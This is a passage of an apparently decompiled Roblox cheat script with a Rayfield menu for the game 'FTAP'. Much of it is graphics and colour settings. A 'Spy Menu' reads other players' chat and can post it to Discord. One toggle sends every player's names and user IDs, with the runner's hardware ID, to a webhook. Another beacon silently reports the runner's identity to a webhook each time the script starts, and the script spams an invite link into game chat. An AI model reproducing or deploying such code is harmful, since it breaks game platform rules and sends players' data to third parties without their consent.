    Options = {
        "Bad",
        "Default",
        "Good",
        "Best"
    },
    CurrentOption = {
        ""
    },
    MultipleOptions = false,
    Flag = "GraphicsQuality",
    Callback = function(p1457)
        local v1458, v1459, v1460 = pairs(p1457)
        local v1461 = ""
        while true do
            local v1462
            v1460, v1462 = v1458(v1459, v1460)
            if v1460 == nil then
                break
            end
            v1461 = v1461 .. v1462
        end
        if v1461 == "Bad" then
            vu450()
            local v1463, v1464, v1465 = pairs(vu1.w:GetDescendants())
            while true do
                local v1466
                v1465, v1466 = v1463(v1464, v1465)
                if v1465 == nil then
                    break
                end
                if v1466:IsA("Part") then
                    local v1467 = Instance.new("BoolValue", v1466)
                    v1467.Name = "gqcs"
                    v1467.Value = v1466.CastShadow
                    v1466.CastShadow = false
                end
            end
            game.Lighting.Technology = "Legacy"
            game.MaterialService.Use2022Materials = true
        elseif v1461 == "Default" then
            vu450()
        elseif v1461 == "Good" then
            vu450()
            game.Lighting.Technology = "ShadowMap"
        elseif v1461 == "Best" then
            vu450()
            local v1468, v1469, v1470 = pairs(vu1.w:GetDescendants())
            while true do
                local v1471
                v1470, v1471 = v1468(v1469, v1470)
                if v1470 == nil then
                    break
                end
                if v1471:IsA("PointLight") then
                    local v1472 = Instance.new("BoolValue", v1471)
                    v1472.Name = "gqs"
                    v1472.Value = v1471.Shadows
                    v1471.Shadows = true
                end
            end
            local v1473, v1474, v1475 = pairs(vu1.w:GetDescendants())
            while true do
                local v1476
                v1475, v1476 = v1473(v1474, v1475)
                if v1475 == nil then
                    break
                end
                if v1476:IsA("SpotLight") then
                    local v1477 = Instance.new("BoolValue", v1476)
                    v1477.Name = "gqs"
                    v1477.Value = v1476.Shadows
                    v1476.Shadows = true
                end
            end
            vu7.sunrays.Intensity = 0.25
            vu7.sunrays.Spread = 1
            game.Lighting.Technology = "Future"
            game.Lighting.OutdoorAmbient = Color3.fromRGB(160, 160, 160)
            game.Lighting.Ambient = Color3.fromRGB(80, 80, 80)
            vu7.bloomeffect.Intensity = 1
            vu7.bloomeffect.Size = 1
            vu7.bloomeffect.Threshold = 1
        end
    end
})
v1451:CreateToggle({
    Name = "Hide All Toys",
    CurrentValue = false,
    Flag = "HideAllToys",
    Callback = function(_)
        vu9.hidealltoys = not vu9.hidealltoys
        local v1478 = vu9.hidealltoys
        while v1478 == vu9.hidealltoys and task.wait() do
            local v1479, v1480, v1481 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v1482
                v1481, v1482 = v1479(v1480, v1481)
                if v1481 == nil then
                    break
                end
                if v1482 ~= vu7.me and vu1.w:FindFirstChild(v1482.Name .. "SpawnedInToys") then
                    local v1483, v1484, v1485 = pairs(vu1.w[v1482.Name .. "SpawnedInToys"]:GetChildren())
                    while true do
                        local v1486
                        v1485, v1486 = v1483(v1484, v1485)
                        if v1485 == nil then
                            break
                        end
                        local v1487, v1488, v1489 = pairs(v1486:GetDescendants())
                        while true do
                            local v1490
                            v1489, v1490 = v1487(v1488, v1489)
                            if v1489 == nil then
                                break
                            end
                            if v1490:IsA("Part") then
                                local v1491 = v1490:FindFirstChild("TValue")
                                if not v1491 then
                                    v1491 = Instance.new("NumberValue", v1490)
                                    v1491.Name = "TValue"
                                    v1491.Value = v1490.Transparency
                                end
                                if vu9.hidealltoys then
                                    v1490.Transparency = 1
                                else
                                    v1490.Transparency = v1491.Value
                                end
                            end
                        end
                        task.wait()
                    end
                end
            end
        end
    end
})
v1451:CreateToggle({
    Name = "No Shadow All Toys",
    CurrentValue = false,
    Flag = "NoShadowAllToys",
    Callback = function(_)
        vu9.shadowalltoys = not vu9.shadowalltoys
        local v1492 = vu9.shadowalltoys
        while v1492 == vu9.shadowalltoys and task.wait() do
            local v1493, v1494, v1495 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v1496
                v1495, v1496 = v1493(v1494, v1495)
                if v1495 == nil then
                    break
                end
                if v1496 ~= vu7.me and vu1.w:FindFirstChild(v1496.Name .. "SpawnedInToys") then
                    local v1497, v1498, v1499 = pairs(vu1.w[v1496.Name .. "SpawnedInToys"]:GetChildren())
                    while true do
                        local v1500
                        v1499, v1500 = v1497(v1498, v1499)
                        if v1499 == nil then
                            break
                        end
                        local v1501, v1502, v1503 = pairs(v1500:GetDescendants())
                        while true do
                            local v1504
                            v1503, v1504 = v1501(v1502, v1503)
                            if v1503 == nil then
                                break
                            end
                            if v1504:IsA("Part") then
                                local v1505 = v1504:FindFirstChild("SValue")
                                if not v1505 then
                                    v1505 = Instance.new("BoolValue", v1504)
                                    v1505.Name = "SValue"
                                    v1505.Value = v1504.CastShadow
                                end
                                if vu9.shadowalltoys then
                                    v1504.CastShadow = false
                                else
                                    v1504.CastShadow = v1505.Value
                                end
                            end
                        end
                        task.wait()
                    end
                end
            end
        end
    end
})
v1451:CreateToggle({
    Name = "Store All Players Toys",
    CurrentValue = false,
    Flag = "StoreAllToys",
    Callback = function(_)
        vu9.storeallplayerstoys = not vu9.storeallplayerstoys
        local v1506 = vu9.storeallplayerstoys
        while v1506 == vu9.storeallplayerstoys and task.wait() do
            local v1507, v1508, v1509 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v1510
                v1509, v1510 = v1507(v1508, v1509)
                if v1509 == nil then
                    break
                end
                if v1510 ~= vu7.me then
                    if vu9.storeallplayerstoys then
                        if vu1.w:FindFirstChild(v1510.Name .. "SpawnedInToys") then
                            vu1.w[v1510.Name .. "SpawnedInToys"].Parent = vu1.RS
                        end
                    elseif vu1.RS:FindFirstChild(v1510.Name .. "SpawnedInToys") then
                        vu1.RS[v1510.Name .. "SpawnedInToys"].Parent = vu1.w
                    end
                end
            end
        end
    end
})
v1451:CreateSection("Sky")
v1451:CreateColorPicker({
    Name = "Clouds Color",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "CloudsColor",
    Callback = function(p1511)
        vu1.w.Terrain.Clouds.Color = p1511
    end
})
v1451:CreateSlider({
    Name = "Time Slider",
    Range = {
        0,
        23
    },
    Increment = 0.001,
    Suffix = "",
    CurrentValue = 14,
    Flag = "FOVSlider",
    Callback = function(p1512)
        game.Lighting.ClockTime = p1512
    end
})
v1451:CreateToggle({
    Name = "Time Sync",
    CurrentValue = false,
    Flag = "timesync",
    Callback = function(p1513)
        timesync = p1513
        while timesync and task.wait(1) do
            local v1514 = request({
                Url = "https://www.timeapi.io/api/time/current/zone?timeZone=Europe%2FAmsterdam",
                Method = "GET"
            })
            local v1515 = vu1.HS:JSONDecode(v1514.Body)
            game.Lighting.TimeOfDay = tostring(tonumber(v1515.hour) + 1) .. ":" .. v1515.minute .. ":" .. v1515.seconds
        end
    end
})
v1451:CreateSection("World")
v1451:CreateColorPicker({
    Name = "Ocean Color",
    Color = Color3.fromRGB(8, 137, 207),
    Flag = "OceanColor",
    Callback = function(p1516)
        local v1517 = vu7.m.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel
        local v1518, v1519, v1520 = pairs(v1517:GetChildren())
        while true do
            local v1521
            v1520, v1521 = v1518(v1519, v1520)
            if v1520 == nil then
                break
            end
            if v1521:IsA("Part") and v1521.Name == "Ocean" then
                v1521.Color = p1516
            end
        end
    end
})
v1451:CreateSection("Others")
v1451:CreateSlider({
    Name = "FOV Slider",
    Range = {
        1,
        120
    },
    Increment = 1,
    Suffix = "(70 Normally)",
    CurrentValue = 70,
    Flag = "FOVSlider",
    Callback = function(p1522)
        vu1.w.CurrentCamera.FieldOfView = p1522
    end
})
v1451:CreateSection("Color Correction")
v1451:CreateToggle({
    Name = "LSD",
    CurrentValue = false,
    Flag = "LSD",
    Callback = function(p1523)
        LSD = p1523
        vu7.ccc.Enabled = LSD
        if LSD then
            local v1524 = vu7.ccc.Brightness
            local v1525 = vu7.ccc.Contrast
            local v1526 = vu7.ccc.Saturation
            vu7.ccc.Brightness = 1
            vu7.ccc.Contrast = 10
            vu7.ccc.Saturation = 1
            while LSD do
                vu7.ccc.TintColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
                task.wait()
            end
            vu7.ccc.Brightness = v1524
            vu7.ccc.Contrast = v1525
            vu7.ccc.Saturation = v1526
        end
    end
})
v1451:CreateToggle({
    Name = "Color Correction",
    CurrentValue = false,
    Flag = "ColorCorrection",
    Callback = function(p1527)
        vu7.ccc.Enabled = p1527
    end
})
v1451:CreateSlider({
    Name = "Brightness",
    Range = {
        0,
        10
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 0,
    Flag = "Brightness",
    Callback = function(p1528)
        vu7.ccc.Brightness = p1528
    end
})
v1451:CreateSlider({
    Name = "Contrast",
    Range = {
        0,
        100
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 0,
    Flag = "Contrast",
    Callback = function(p1529)
        vu7.ccc.Contrast = p1529
    end
})
v1451:CreateSlider({
    Name = "Saturation",
    Range = {
        0,
        100
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 0,
    Flag = "Saturation",
    Callback = function(p1530)
        vu7.ccc.Saturation = p1530
    end
})
v1451:CreateColorPicker({
    Name = "Tint Color",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "TintColor",
    Callback = function(p1531)
        vu7.ccc.TintColor = p1531
    end
})
local v1532 = v491:CreateTab("GUI", 7733774602)
v1532:CreateSection("Rayfield")
v1532:CreateColorPicker({
    Name = "TextColor",
    Color = Color3.fromRGB(240, 240, 240),
    Flag = "TextColor/rfc",
    Callback = function(p1533)
        vu13.field.Theme.Default2.TextColor = p1533
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "Background",
    Color = Color3.fromRGB(25, 25, 25),
    Flag = "Background/rfc",
    Callback = function(p1534)
        vu13.field.Theme.Default2.Background = p1534
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "Topbar",
    Color = Color3.fromRGB(34, 34, 34),
    Flag = "Topbar/rfc",
    Callback = function(p1535)
        vu13.field.Theme.Default2.Topbar = p1535
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "Shadow",
    Color = Color3.fromRGB(20, 20, 20),
    Flag = "Shadow/rfc",
    Callback = function(p1536)
        vu13.field.Theme.Default2.Shadow = p1536
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "NotificationBackground",
    Color = Color3.fromRGB(20, 20, 20),
    Flag = "NotificationBackground/rfc",
    Callback = function(p1537)
        vu13.field.Theme.Default2.NotificationBackground = p1537
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "NotificationActionsBackground",
    Color = Color3.fromRGB(230, 230, 230),
    Flag = "NotificationActionsBackground/rfc",
    Callback = function(p1538)
        vu13.field.Theme.Default2.NotificationActionsBackground = p1538
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "TabBackground",
    Color = Color3.fromRGB(80, 80, 80),
    Flag = "TextTabBackgroundColor/rfc",
    Callback = function(p1539)
        vu13.field.Theme.Default2.TextTabBackgroundColor = p1539
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "TabStroke",
    Color = Color3.fromRGB(85, 85, 85),
    Flag = "TabStroke/rfc",
    Callback = function(p1540)
        vu13.field.Theme.Default2.TabStroke = p1540
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "TabBackgroundSelected",
    Color = Color3.fromRGB(210, 210, 210),
    Flag = "TabBackgroundSelected/rfc",
    Callback = function(p1541)
        vu13.field.Theme.Default2.TabBackgroundSelected = p1541
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "TabTextColor",
    Color = Color3.fromRGB(240, 240, 240),
    Flag = "TabTextColor/rfc",
    Callback = function(p1542)
        vu13.field.Theme.Default2.TabTextColor = p1542
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "SelectedTabTextColor",
    Color = Color3.fromRGB(50, 50, 50),
    Flag = "SelectedTabTextColor/rfc",
    Callback = function(p1543)
        vu13.field.Theme.Default2.SelectedTabTextColor = p1543
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ElementBackground",
    Color = Color3.fromRGB(35, 35, 35),
    Flag = "ElementBackground/rfc",
    Callback = function(p1544)
        vu13.field.Theme.Default2.ElementBackground = p1544
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ElementBackgroundHover",
    Color = Color3.fromRGB(40, 40, 40),
    Flag = "ElementBackgroundHover/rfc",
    Callback = function(p1545)
        vu13.field.Theme.Default2.ElementBackgroundHover = p1545
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "SecondaryElementBackground",
    Color = Color3.fromRGB(25, 25, 25),
    Flag = "SecondaryElementBackground/rfc",
    Callback = function(p1546)
        vu13.field.Theme.Default2.SecondaryElementBackground = p1546
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ElementStroke",
    Color = Color3.fromRGB(50, 50, 50),
    Flag = "ElementStroke/rfc",
    Callback = function(p1547)
        vu13.field.Theme.Default2.ElementStroke = p1547
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "SecondaryElementStroke",
    Color = Color3.fromRGB(40, 40, 40),
    Flag = "SecondaryElementStroke/rfc",
    Callback = function(p1548)
        vu13.field.Theme.Default2.SecondaryElementStroke = p1548
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "SliderBackground",
    Color = Color3.fromRGB(43, 105, 159),
    Flag = "SliderBackground/rfc",
    Callback = function(p1549)
        vu13.field.Theme.Default2.SliderBackground = p1549
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "SliderProgress",
    Color = Color3.fromRGB(43, 105, 159),
    Flag = "SliderProgress/rfc",
    Callback = function(p1550)
        vu13.field.Theme.Default2.SliderProgress = p1550
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "SliderStroke",
    Color = Color3.fromRGB(48, 119, 177),
    Flag = "SliderStroke/rfc",
    Callback = function(p1551)
        vu13.field.Theme.Default2.SliderStroke = p1551
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ToggleBackground",
    Color = Color3.fromRGB(30, 30, 30),
    Flag = "ToggleBackground/rfc",
    Callback = function(p1552)
        vu13.field.Theme.Default2.ToggleBackground = p1552
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ToggleEnabled",
    Color = Color3.fromRGB(0, 146, 214),
    Flag = "ToggleEnabled/rfc",
    Callback = function(p1553)
        vu13.field.Theme.Default2.ToggleEnabled = p1553
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ToggleDisabled",
    Color = Color3.fromRGB(100, 100, 100),
    Flag = "ToggleDisabled/rfc",
    Callback = function(p1554)
        vu13.field.Theme.Default2.ToggleDisabled = p1554
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ToggleEnabledStroke",
    Color = Color3.fromRGB(0, 170, 255),
    Flag = "ToggleEnabledStroke/rfc",
    Callback = function(p1555)
        vu13.field.Theme.Default2.ToggleEnabledStroke = p1555
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ToggleDisabledStroke",
    Color = Color3.fromRGB(125, 125, 125),
    Flag = "ToggleDisabledStroke/rfc",
    Callback = function(p1556)
        vu13.field.Theme.Default2.ToggleDisabledStroke = p1556
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ToggleEnabledOuterStroke",
    Color = Color3.fromRGB(100, 100, 100),
    Flag = "ToggleEnabledOuterStroke/rfc",
    Callback = function(p1557)
        vu13.field.Theme.Default2.ToggleEnabledOuterStroke = p1557
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "ToggleDisabledOuterStroke",
    Color = Color3.fromRGB(65, 65, 65),
    Flag = "ToggleDisabledOuterStroke/rfc",
    Callback = function(p1558)
        vu13.field.Theme.Default2.ToggleDisabledOuterStroke = p1558
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "InputBackground",
    Color = Color3.fromRGB(30, 30, 30),
    Flag = "InputBackground/rfc",
    Callback = function(p1559)
        vu13.field.Theme.Default2.InputBackground = p1559
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "InputStroke",
    Color = Color3.fromRGB(65, 65, 65),
    Flag = "InputStroke/rfc",
    Callback = function(p1560)
        vu13.field.Theme.Default2.InputStroke = p1560
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateColorPicker({
    Name = "PlaceholderColor",
    Color = Color3.fromRGB(178, 178, 178),
    Flag = "PlaceholderColor/rfc",
    Callback = function(p1561)
        vu13.field.Theme.Default2.PlaceholderColor = p1561
        vu13.field:ChangeTheme("Default2")
    end
})
v1532:CreateSection("FTAP")
v1532:CreateColorPicker({
    Name = "Coins",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "Coins/ftapc",
    Callback = function(p1562)
        vu12.ftapcolors.Coins = p1562
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "TabBar",
    Color = Color3.fromRGB(66, 66, 66),
    Flag = "TabBar/ftapc",
    Callback = function(p1563)
        vu12.ftapcolors.TabBar = p1563
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "Settings",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "Settings/ftapc",
    Callback = function(p1564)
        vu12.ftapcolors.Settings = p1564
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "Shop",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "Shop/ftapc",
    Callback = function(p1565)
        vu12.ftapcolors.Shop = p1565
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ToyDestroy",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "ToyDestroy/ftapc",
    Callback = function(p1566)
        vu12.ftapcolors.ToyDestroy = p1566
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ToyShop",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "ToyShop/ftapc",
    Callback = function(p1567)
        vu12.ftapcolors.ToyShop = p1567
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "Toys",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "Toys/ftapc",
    Callback = function(p1568)
        vu12.ftapcolors.Toys = p1568
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "SettingsContents",
    Color = Color3.fromRGB(90, 90, 90),
    Flag = "SettingsContents/ftapc",
    Callback = function(p1569)
        vu12.ftapcolors.SettingsContents = p1569
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "SettingsTitle",
    Color = Color3.fromRGB(66, 66, 66),
    Flag = "SettingsTitle/ftapc",
    Callback = function(p1570)
        vu12.ftapcolors.SettingsTitle = p1570
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ShopTitle",
    Color = Color3.fromRGB(66, 66, 66),
    Flag = "ShopTitle/ftapc",
    Callback = function(p1571)
        vu12.ftapcolors.ShopTitle = p1571
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ShopContents",
    Color = Color3.fromRGB(90, 90, 90),
    Flag = "ShopContents/ftapc",
    Callback = function(p1572)
        vu12.ftapcolors.ShopContents = p1572
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ToysContents",
    Color = Color3.fromRGB(90, 90, 90),
    Flag = "ToysContents/ftapc",
    Callback = function(p1573)
        vu12.ftapcolors.ToysContents = p1573
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "FavoritesFrame",
    Color = Color3.fromRGB(120, 120, 120),
    Flag = "FavoritesFrame/ftapc",
    Callback = function(p1574)
        vu12.ftapcolors.FavoritesFrame = p1574
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "Favorites",
    Color = Color3.fromRGB(66, 66, 66),
    Flag = "Favorites/ftapc",
    Callback = function(p1575)
        vu12.ftapcolors.Favorites = p1575
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "MeterFrame",
    Color = Color3.fromRGB(120, 120, 120),
    Flag = "MeterFrame/ftapc",
    Callback = function(p1576)
        vu12.ftapcolors.MeterFrame = p1576
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "SortingTabs",
    Color = Color3.fromRGB(120, 120, 120),
    Flag = "SortingTabs/ftapc",
    Callback = function(p1577)
        vu12.ftapcolors.SortingTabs = p1577
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ToysTitle",
    Color = Color3.fromRGB(66, 66, 66),
    Flag = "ToysTitle/ftapc",
    Callback = function(p1578)
        vu12.ftapcolors.ToysTitle = p1578
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "DestroyTitle",
    Color = Color3.fromRGB(66, 66, 66),
    Flag = "DestroyTitle/ftapc",
    Callback = function(p1579)
        vu12.ftapcolors.DestroyTitle = p1579
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "DestroyContents",
    Color = Color3.fromRGB(90, 90, 90),
    Flag = "DestroyContents/ftapc",
    Callback = function(p1580)
        vu12.ftapcolors.DestroyContents = p1580
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "DestroyMeterFrame",
    Color = Color3.fromRGB(120, 120, 120),
    Flag = "DestroyMeterFrame/ftapc",
    Callback = function(p1581)
        vu12.ftapcolors.DestroyMeterFrame = p1581
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ToyShopTitle",
    Color = Color3.fromRGB(66, 66, 66),
    Flag = "ToyShopTitle/ftapc",
    Callback = function(p1582)
        vu12.ftapcolors.ToyShopTitle = p1582
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ToyShopSortingTabs",
    Color = Color3.fromRGB(120, 120, 120),
    Flag = "ToyShopSortingTabs/ftapc",
    Callback = function(p1583)
        vu12.ftapcolors.ToyShopSortingTabs = p1583
        vu381()
    end
})
v1532:CreateColorPicker({
    Name = "ToyShopContents",
    Color = Color3.fromRGB(90, 90, 90),
    Flag = "ToyShopContents/ftapc",
    Callback = function(p1584)
        vu12.ftapcolors.ToyShopContents = p1584
        vu381()
    end
})
GridLayoutX = 90
GridLayoutY = 90
v1532:CreateSlider({
    Name = "Grid Layout X",
    Range = {
        0,
        100
    },
    Increment = 1,
    Suffix = "(90 Default)",
    CurrentValue = 90,
    Flag = "GridLayoutX",
    Callback = function(p1585)
        GridLayoutX = p1585
        vu7.me.PlayerGui.MenuGui.Menu.TabContents.Toys.Contents.UIGridLayout.CellSize = UDim2.new(0, GridLayoutX, 0, GridLayoutY)
        vu7.me.PlayerGui.MenuGui.Menu.TabContents.ToyShop.Contents.UIGridLayout.CellSize = UDim2.new(0, GridLayoutX, 0, GridLayoutY)
        vu7.me.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.UIGridLayout.CellSize = UDim2.new(0, GridLayoutX, 0, GridLayoutY)
    end
})
v1532:CreateSlider({
    Name = "Grid Layout Y",
    Range = {
        0,
        100
    },
    Increment = 1,
    Suffix = "(90 Default)",
    CurrentValue = 90,
    Flag = "GridLayoutY",
    Callback = function(p1586)
        GridLayoutY = p1586
        vu7.me.PlayerGui.MenuGui.Menu.TabContents.Toys.Contents.UIGridLayout.CellSize = UDim2.new(0, GridLayoutX, 0, GridLayoutY)
        vu7.me.PlayerGui.MenuGui.Menu.TabContents.ToyShop.Contents.UIGridLayout.CellSize = UDim2.new(0, GridLayoutX, 0, GridLayoutY)
        vu7.me.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.UIGridLayout.CellSize = UDim2.new(0, GridLayoutX, 0, GridLayoutY)
    end
})
v1451:CreateSection("Crosshair")
local v1587 = v491:CreateTab("Spy Menu", 7733678388)
v1587:CreateSection("Chat Spy")
v1587:CreateToggle({
    Name = "Spy Toggle",
    CurrentValue = false,
    Flag = "SpyToggle",
    Callback = function(p1588)
        vu9.spyenabled = p1588
        vu12.privateProperties.Text = "\239\191\189\239\191\189VSPY " .. (vu9.spyenabled and "EN" or "DIS") .. "ABLED\226\153\165"
        vu7.me:WaitForChild("PlayerGui"):WaitForChild("Chat")
        vu1.StarterGui:SetCore("ChatMakeSystemMessage", vu12.privateProperties)
    end
})
v1587:CreateToggle({
    Name = "Publish To Chat",
    CurrentValue = false,
    Flag = "PublishToChat",
    Callback = function(p1589)
        vu9.public = p1589
    end
})
v1587:CreateToggle({
    Name = "Publish To Discord",
    CurrentValue = false,
    Flag = "PublishToDiscord",
    Callback = function(p1590)
        vu9.publicds = p1590
    end
})
v1587:CreateColorPicker({
    Name = "Spy Color",
    Color = Color3.fromRGB(255, 0, 0),
    Callback = function(p1591)
        vu12.privateProperties.Color = p1591
    end
})
v1587:CreateSection("Player Spy")
v1587:CreateToggle({
    Name = "Publish All Info To Discord",
    CurrentValue = false,
    Flag = "PublishAllInfoToDiscord",
    Callback = function(p1592)
        vu9.paitd = p1592
        vu420("spyallplrinfo3333333333333333333", 3)
        print(vu9.spyallplrinfo)
        if vu9.spyallplrinfo then
            vu420("spyallplrinfo", 3)
            local v1593, v1594, v1595 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v1596
                v1595, v1596 = v1593(v1594, v1595)
                if v1595 == nil then
                    break
                end
                vu420("spyallplrinfo123123123", 3)
                vu60(vu10.playerinfoweb, {
                    content = v1596.DisplayName .. " " .. v1596.Name .. " " .. v1596.UserId .. " " .. v1596.FollowUserId .. " " .. gethwid(),
                    username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")"
                })
            end
            vu9.spyallplrinfo = false
        end
    end
})
local v1597 = v491:CreateTab("Info", 7733964719)
v1597:CreateLabel("Creator: VHCK")
v1597:CreateButton({
    Name = "Copy Discord URL",
    Callback = function()
        setclipboard("https://discord.gg/BCw8KuTDnj")
    end
})
v1597:CreateButton({
    Name = "Say to chat disscord link",
    Callback = function()
        vu7.Events.saymsg:FireServer("d\205\159s\205\159c\205\159.\205\159g\205\159g\205\159/\205\159v\205\159h\205\159s\205\159s\205\159", "All")
    end
})
vu1.w.ChildAdded:Connect(function(p1598)
    if p1598.Name == "BlackHoleKick" then
        vu8.kickcountc = vu8.kickcountc + 1
        vu676:Set("Kicked: " .. vu8.kickcountc)
        vu770:Set("Kicked: " .. vu8.kickcountc)
        vu60(vu10.kicksweb, {
            content = "+kick",
            username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")"
        })
    end
end)
vu60(vu10.executedweb, {
    content = "\239\191\189\208\176\208\191\209\131\209\129\209\130\208\184\208\187\209\129\209\143/It started",
    username = vu7.me.DisplayName .. " (" .. vu7.myname .. ")"
})
if isfile("VHS/sspylist.vhs") then
    vu12.sspylist = vu1.HS:JSONDecode(readfile("VHS/sspylist.vhs"))
end
if isfile("VHS/LineColor.vhs") then
    local v1599, v1600, v1601 = ipairs(vu1.HS:JSONDecode(readfile("VHS/LineColor.vhs")))
    while true do
        local v1602
        v1601, v1602 = v1599(v1600, v1601)
        if v1601 == nil then
            break
        end
        vu12.ccolors[v1601] = v105(v1602)
    end
end
if vu56(vu7.myname) or (v407(vu12.admins, vu7.me.UserId) or vu9.vhsows) then
    local v1603 = v407(vu12.admins, vu7.me.UserId) and ": Admin mode" or ""
    local v1604 = vu9.vhsows and ": OWNER MODE" or v1603
    vu7.Events.saymsg:FireServer("\239\191\189\239\191\189VHSV6\226\153\165(Best Scripts)" .. v1604, "ALL")
    vu7.Events.saymsg:FireServer("d\205\159s\205\159c\205\159.\205\159g\205\159g\205\159/\205\159v\205\159h\205\159s\205\159s\205\159", "All")
end
task.delay(1, function()
    vu12.ftapcolors = vu13.field.Theme.ftapc
end)
task.delay(1, function()
    vu13.field:ChangeTheme("Default2")
end)
task.delay(1, function()
    vu429()
end)
task.delay(1, function()
    vu381()
end)
task.delay(1, function()
    vu388()
end)
task.delay(1, function()
    vu441()
end)
vu13.field:LoadConfiguration()
